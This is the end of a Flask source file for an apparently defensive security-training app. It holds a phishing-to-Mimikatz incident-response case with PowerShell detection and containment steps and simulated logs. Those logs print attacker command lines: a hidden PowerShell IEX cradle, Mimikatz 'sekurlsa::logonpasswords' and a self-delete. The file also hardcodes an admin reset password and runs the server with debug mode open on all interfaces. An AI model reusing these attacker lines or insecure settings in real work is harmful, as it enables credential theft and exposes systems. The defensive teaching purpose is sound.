                     "who": "SOC Tier 2 analyst",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} -MaxEvents 50 | Where-Object {$_.Message -match 'lsass.exe'} | Select-Object TimeCreated, @{N='Source';E={$_.Properties[2].Value}}, @{N='Access';E={$_.Properties[6].Value}}, @{N='User';E={$_.Properties[12].Value}}",
                     "desc": "EDR alert: LSASS access on workstation-42. Analyst confirms the dump",
                     "output": (
                         "TimeCreated          Source         Access   User\n"
                         "-----------          ------         ------   ----\n"
                         "3/15/2024 9:15 AM    m.exe          0x1410   COMPANY\\alice\n"
                         "3/15/2024 9:15 AM    m.exe          0x1410   COMPANY\\alice\n\n"
                         "⚠️  C:\\Users\\Public\\m.exe (unsigned) accessed lsass.exe with 0x1410"
                     ),
                     "why": "CONFIRMED credential dump. The source path C:\\Users\\Public is highly suspicious (not System32). User is alice — the phishing victim. Escalate to P1."},

                    {"phase": "Investigation — Attack Chain", "icon": "🔍",
                     "who": "SOC Tier 2 analyst",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=1} -MaxEvents 500 | Where-Object {$_.Message -match 'm\\.exe|powershell.*DownloadString|winword'} | Select-Object TimeCreated, @{N='Image';E={$_.Properties[4].Value}}, @{N='CmdLine';E={$_.Properties[10].Value}}, @{N='Parent';E={$_.Properties[20].Value}}",
                     "desc": "Reconstruct the full attack chain from process creation events",
                     "output": (
                         "TimeCreated       Image              CmdLine                                              Parent\n"
                         "-----------       -----              -------                                              ------\n"
                         "9:14 AM           WINWORD.EXE        \"C:\\...\\WINWORD.EXE\" invoice.docm                 explorer.exe\n"
                         "9:14 AM           powershell.exe     powershell -nop -w hidden -c IEX ...                 WINWORD.EXE\n"
                         "9:15 AM           m.exe              C:\\Users\\Public\\m.exe sekurlsa::logonpasswords     powershell.exe\n"
                         "9:15 AM           cmd.exe            cmd /c del C:\\Users\\Public\\m.exe                   m.exe"
                     ),
                     "why": "Full chain visible: phishing → Word → PowerShell → Mimikatz → cleanup. Attacker deleted m.exe (anti-forensics). Recover from memory or from backup copy on other hosts."},

                    {"phase": "Containment — Host Isolation", "icon": "🛡️",
                     "who": "SOC analyst + sysadmin",
                     "cmd": "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -notmatch '^(10\\.|192\\.168\\.|127\\.)'} | ForEach-Object { New-NetFirewallRule -DisplayName \"Block C2 $($_.RemoteAddress)\" -Direction Outbound -RemoteAddress $_.RemoteAddress -Action Block }",
                     "desc": "Block all outbound traffic from the infected workstation to external IPs",
                     "output": (
                         "Name                     : Block C2 203.0.113.50\n"
                         "Enabled                  : True\n"
                         "Action                   : Block\n"
                         "Direction                : Outbound\n\n"
                         "Name                     : Block C2 198.51.100.42\n"
                         "Enabled                  : True\n"
                         "Action                   : Block\n"
                         "Direction                : Outbound\n\n"
                         "(46 rules added total)"
                     ),
                     "why": "Host isolated from C2. Attacker loses contact. Machine still runs for forensics but can't communicate externally."},

                    {"phase": "Domain-wide Containment", "icon": "🚨",
                     "who": "SOC + AD admin",
                     "cmd": "Get-ADUser dadmin | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString 'TempPass2024!#ChangeMe' -AsPlainText -Force) && Get-ADUser dadmin | Disable-ADAccount && Get-ADGroupMember 'Domain Admins' | ForEach-Object { if($_.SamAccountName -ne 'Administrator'){ Disable-ADAccount -Identity $_.SamAccountName } }",
                     "desc": "Reset dadmin's password, disable the account, disable all Domain Admins temporarily",
                     "output": (
                         "(dadmin password reset)\n"
                         "(dadmin account disabled)\n\n"
                         "WARNING: 4 Domain Admin accounts disabled. Only Administrator remains.\n"
                         "This will break service accounts that use Domain Admin credentials."
                     ),
                     "why": "The attacker stole dadmin's hash. Rotate immediately. Disabling ALL Domain Admins temporarily blocks the attacker from using any compromised DA account, even if they have other hashes we don't know about."},

                    {"phase": "KRBTGT Reset", "icon": "🔐",
                     "who": "AD admin (with security approval)",
                     "cmd": "Reset-KrbtgtPassword (custom script that resets twice with 10-hour delay)",
                     "desc": "Reset the KRBTGT account password — invalidates all Kerberos tickets including Golden Tickets",
                     "output": (
                         "First KRBTGT reset: 3/15/2024 10:00 AM\n"
                         "Waiting 10 hours for replication...\n"
                         "Second KRBTGT reset: 3/15/2024 8:00 PM\n\n"
                         "⚠️  ALL Kerberos tickets across the domain are now invalid.\n"
                         "    Users will be re-prompted for authentication."
                     ),
                     "why": "If the attacker had time to forge a Golden Ticket, only resetting KRBTGT twice (with a gap for replication) invalidates it. This is a nuclear option that requires careful coordination."},

                    {"phase": "Evidence Preservation", "icon": "📸",
                     "who": "SOC analyst + digital forensics",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'} -MaxEvents 50000 | Export-Csv C:\\Evidence\\sysmon_full.csv -NoTypeInformation && Get-WinEvent -FilterHashtable @{LogName='Security'} -MaxEvents 50000 | Export-Csv C:\\Evidence\\security_full.csv -NoTypeInformation && Copy-Item C:\\Users\\Public -Destination C:\\Evidence\\ -Recurse",
                     "desc": "Export all Sysmon + Security events, copy suspicious directories",
                     "output": (
                         "sysmon_full.csv:    245 MB, 50000 events\n"
                         "security_full.csv:  380 MB, 50000 events\n"
                         "C:\\Evidence\\Public\\: copied (attacker's working directory)"
                     ),
                     "why": "Preserve everything before rebuilding. Legal may need it. Also capture memory dump of the machine (if still running) for advanced forensics."},

                    {"phase": "Rebuild", "icon": "🔧",
                     "who": "IT + security team",
                     "cmd": "(rebuild workstation from known-good image, restore data from pre-incident backup)",
                     "desc": "Wipe and rebuild all compromised hosts from clean images",
                     "output": (
                         "Workstation-42: rebuilt from gold image 3/16 09:00\n"
                         "FILESRV01: rebuild scheduled 3/16 14:00\n"
                         "APPSRV01: rebuild scheduled 3/16 18:00\n\n"
                         "Domain controller: OS reloaded, all AD users recreated from backup\n"
                         "Restored data: pre-incident backup from 3/14 23:00 (48 hours of lost work)"
                     ),
                     "why": "Once LSASS is dumped and DA credentials are stolen, the only safe path is a full rebuild. Anything short of that leaves potential backdoors."}
                ],

                "impact": {
                    "what_was_leaked": "Alice's credentials + dadmin's NTLM hash + potential full domain compromise (KRBTGT possible Golden Ticket)",
                    "downtime": "72 hours — all Windows hosts had to be rebuilt",
                    "cost": "$2.4M — rebuild labor + 48 hours lost work + regulatory notification + incident response fees",
                    "root_cause": "Phishing email with Office macro → LSASS credential dump → DA hash reuse → no MFA on privileged accounts",
                    "fixes": [
                        "Block macros from internet sources via Group Policy (Office Trust Center)",
                        "Deploy phishing-resistant MFA (FIDO2) for ALL domain admin accounts",
                        "Enable Credential Guard on all Windows endpoints (isolates LSASS in virtualized container)",
                        "Restrict Domain Admin logons to Domain Controllers only (Admin Tier model)",
                        "Deploy Windows Defender Application Control to block unsigned executables",
                        "Alert on any LSASS access (Sysmon Event 10) — page on-call regardless of hour",
                        "Enable Controlled Folder Access (blocks ransomware encryption)",
                        "Two-person rule for KRBTGT reset — require security approval",
                        "Enterprise-wide email gateway with attachment sandboxing"
                    ]
                }
            }
        ]
    }
}
# ==================================================================
#  BUILD THE UNIFIED SEARCH INDEX
# ==================================================================
def build_search_index():
    index = []
    for mod_key, mod in MODULES.items():
        for cmd in mod.get("commands", []):
            index.append({
                "module": mod_key,
                "module_title": mod["title"],
                "module_icon": mod["icon"],
                "kind": "command",
                "id": cmd["id"],
                "title": cmd["cmd"],
                "body": cmd["desc"],
                "extra_text": cmd.get("scenario", ""),
                "color": cmd.get("color", "#38bdf8"),
            })
        for sc in mod.get("scenarios", []):
            index.append({
                "module": mod_key,
                "module_title": mod["title"],
                "module_icon": mod["icon"],
                "kind": "scenario",
                "id": sc["id"],
                "title": sc["title"],
                "body": sc["situation"],
                "extra_text": sc.get("analysis", ""),
                "color": sc.get("color", "#38bdf8"),
            })
        extra = mod.get("extra", {})
        for cmd in extra.get("iptables_commands", []):
            index.append({
                "module": mod_key,
                "module_title": f"{mod['title']} — iptables",
                "module_icon": "⚙️",
                "kind": "command",
                "id": cmd["id"],
                "title": cmd["cmd"],
                "body": cmd["desc"],
                "extra_text": cmd.get("scenario", ""),
                "color": cmd.get("color", "#38bdf8"),
            })
    return index

SEARCH_INDEX = build_search_index()


# ==================================================================
#  ROUTES
# ==================================================================
@app.route('/')
def index():
    modules_list = [
        {"key": k, "title": m["title"], "icon": m["icon"],
         "intro": m["intro"]["what"],
         "tags": list({c["category"] for c in m.get("commands", [])})[:4]}
        for k, m in MODULES.items()
    ]
    return render_template('index.html', modules=modules_list)


@app.route('/module/<module_key>')
def module_view(module_key):
    mod = MODULES.get(module_key)
    if not mod:
        return "Module not found", 404

    annotated = []
    for c in mod.get("commands", []):
        c2 = dict(c)
        c2["tokens"] = annotate_command(c["cmd"])
        annotated.append(c2)

    annotated_scenarios = []
    for sc in mod.get("scenarios", []):
        sc2 = dict(sc)
        sc2["detection_tokens"] = annotate_command(sc.get("detection_cmd", ""))
        annotated_scenarios.append(sc2)

    extra = dict(mod.get("extra", {}))

    if "iptables_commands" in extra:
        enriched_ipt = []
        for c in extra["iptables_commands"]:
            c2 = dict(c)
            c2["tokens"] = annotate_command(c["cmd"])
            enriched_ipt.append(c2)
        extra["iptables_commands"] = enriched_ipt

    # NEW: annotate attack & defend commands
    if "attacks" in extra:
        enriched_attacks = []
        for atk in extra["attacks"]:
            atk_copy = dict(atk)

            new_chain = []
            for step in atk_copy.get("attack_chain", []):
                s2 = dict(step)
                s2["tokens"] = annotate_command(step.get("cmd", ""))
                new_chain.append(s2)
            atk_copy["attack_chain"] = new_chain

            new_dfn = []
            for step in atk_copy.get("defense_chain", []):
                s2 = dict(step)
                s2["tokens"] = annotate_command(step.get("cmd", ""))
                new_dfn.append(s2)
            atk_copy["defense_chain"] = new_dfn

            enriched_attacks.append(atk_copy)

        extra["attacks"] = enriched_attacks

    if "cases" in extra:
        enriched_cases = []
        for case in extra["cases"]:
            case_copy = dict(case)
            case_commands = []
            for c in case_copy.get("commands", []):
                c2 = dict(c)
                c2["tokens"] = annotate_command(c["cmd"])
                case_commands.append(c2)
            case_copy["commands"] = case_commands
            enriched_cases.append(case_copy)
        extra["cases"] = enriched_cases

    return render_template(
        mod["template"],
        module=mod,
        intro=mod["intro"],
        commands=annotated,
        scenarios=annotated_scenarios,
        extra=extra,
    )

@app.route('/ufw')
def ufw_alias():
    return module_view("ufw")


@app.route('/search')
def search():
    q = request.args.get('q', '').strip().lower()
    results = []

    if q:
        for item in SEARCH_INDEX:
            haystack = (item["title"] + " " + item["body"] + " " + item["extra_text"]).lower()
            if q in haystack:
                results.append({
                    "type": item["module_title"],
                    "icon": item["module_icon"],
                    "title": item["title"],
                    "body": item["body"],
                    "color": item["color"],
                    "link": f"/module/{item['module']}?open={item['id']}#card-{item['id']}",
                })

        for key, tip in COMMAND_TOOLTIPS.items():
            if key and (q in key.lower() or q in tip.lower()):
                results.append({
                    "type": "Glossary",
                    "icon": "📖",
                    "title": key,
                    "body": tip,
                    "color": "#38bdf8",
                    "link": "/ufw#glossary",
                })

    return render_template('search.html', query=q, results=results)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
